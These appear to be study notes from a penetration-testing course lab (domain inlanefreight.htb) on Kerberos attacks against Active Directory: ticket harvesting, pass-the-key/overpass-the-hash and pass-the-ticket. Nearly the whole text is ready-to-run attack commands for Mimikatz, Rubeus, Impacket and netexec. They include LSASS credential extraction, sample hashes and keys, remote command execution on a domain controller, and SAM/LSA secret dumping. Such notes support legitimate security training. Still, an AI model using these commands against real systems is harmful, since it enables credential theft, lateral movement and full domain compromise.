
## Table of Contents:

- [[#Harvesting Kerberos Tickets]]
- [[#Pass the Key / Overpass the Hash]]
- [[#Pass the Ticket (PtT)]]
- [[#Cheatsheet]]

If user wants to connect to MSSQL DB, request `TGS` to `Key Distribution Center` (`KDC`) presenting `TGT`.

---
## Harvesting Kerberos Tickets
### Mimikatz

```PowerShell
C:\Tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
### Exporting Tickets

C:\Tools> dir *.kirbi
### Listing exporte d tickets
```

Tickets ending with `$` corresponds to computer account.

### Rubeus

Prints tickets in `base64` format and `/nowrap` allows copy-pasting.

```PowerShell
C:\Tools> Rubeus.exe dump /nowrap
```

---

## Pass the Key / Overpass the Hash

Converts hash/key for domain-joined user into full `TGT`
### Mimikatz

```PowerShell
C:\Tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys

### Gives `AES256_HMAC` `RC4_HMAC_NT` etc. keys

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

### spawns cmd.exe which can request access to any service in context of target.
```

### Rubeus (No admin needed)

```PowerShell
C:\Tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

---

## Pass the Ticket (PtT)

### Rubeus

```PowerShell
C:\Tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
### ptt submit tickets to current logon session

C:\Tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
### imports ticket into current session using kirbi

PS C:\Tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))`
### converts .kirbi file to base64

c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
```

### Mimikatz

```PowerShell
C:\tools> mimikatz.exe 
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

### tickets are submitted to current logon session

C:\Tools> dir \\DC01.inlanefreight.htb\c$
C:\Tools> Enter-PSSession -ComputerName DC01
### PowerShell Remoting, needs admin or Remote Mgmt Users Group
```

### Rubeus - PowerShell Remoting

```PowerShell
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
### Creates a sacrificial logon process and spawns a cmd, /show displays process
### This prevents the erasure of existing TGTs for the current logon session.

C:\Tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
### Submits tickets to our current logon session

PS C:\Tools> Enter-PSSession -ComputerName DC01
```

---

## Cheatsheet

### Pass-The-Key

Linux:
```bash
# with an NT hash (overpass-the-hash)
getTGT.py -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET

# with an AES (128 or 256 bits) key (pass-the-key) retrieved with sekurlsa::ekeys
getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET
```

Windows Rubeus:
```PowerShell
# with an NT hash
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NThash /ptt

# with an AES 128/256 key
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes128/256:$aes128/256_key /ptt
```

Windows Mimikatz:
```PowerShell
# with an NT hash
sekurlsa::pth /user:$USER /domain:$DOMAIN /rc4:$NThash /ptt

# with an AES 128/256 key
sekurlsa::pth /user:$USER /domain:$DOMAIN /aes128/256:$aes128/256_key /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](https://www.thehacker.recipes/ad/movement/kerberos/ptt#injecting-the-ticket)
- On Windows systems, tools like [Mimikatz](https://github.com/gentilkiwi/mimikatz) and [Rubeus](https://github.com/GhostPack/Rubeus) inject the ticket in memory. Native Microsoft tools can then use the ticket just like usual.
- On UNIX-like systems, the path to the `.ccache` ticket to use has to be referenced in the environment variable `KRB5CCNAME`

### Pass-The-Ticket

Converting ticket if needed:
```sh
# Windows -> UNIX
ticketConverter.py $ticket.kirbi $ticket.ccache

# UNIX -> Windows
ticketConverter.py $ticket.ccache $ticket.kirbi
```

Export ticket on Linux:
```bash
export KRB5CCNAME=$path_to_ticket.ccache
```

Command Execution:
```bash
psexec.py -k 'DOMAIN/USER@TARGET'
smbexec.py -k 'DOMAIN/USER@TARGET'
wmiexec.py -k 'DOMAIN/USER@TARGET'
atexec.py -k 'DOMAIN/USER@TARGET'
dcomexec.py -k 'DOMAIN/USER@TARGET'

netexec winrm $TARGETS -k -x whoami
netexec smb $TARGETS -k -x whoami
```

Credentials Dumping:
```bash
secretsdump.py -k $TARGET

netexec smb $TARGETS -k --sam
netexec smb $TARGETS -k --lsa
```

https://www.thehacker.recipes/ad/movement/kerberos/ptt

---